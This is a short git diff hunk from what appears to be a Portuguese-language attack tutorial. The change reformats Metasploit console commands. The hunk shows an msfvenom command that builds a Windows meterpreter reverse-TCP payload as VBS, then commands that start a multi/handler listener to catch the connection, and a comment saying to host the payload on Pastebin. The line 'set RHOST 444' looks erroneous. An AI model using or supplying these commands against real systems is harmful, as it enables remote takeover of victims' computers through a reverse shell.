@@ -12,11 +12,11 @@ msfvenom -p windows/meterpreter/reverse_tcp -f vbs –smallest LHOST=“attacker
 
 systemctl start postgresql
 msfconsole -q
-> use exploit/multi/handler
-> set PAYLOAD windows/meterpreter/reverse_tcp
-> set LHOST "attacker ip"
-> set RHOST 444
-> exploit
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST "attacker ip"
+set RHOST 444
+exploit
 
 #Jogue o codigo criado no arquivo "payload.txt" no Pastebin:
 
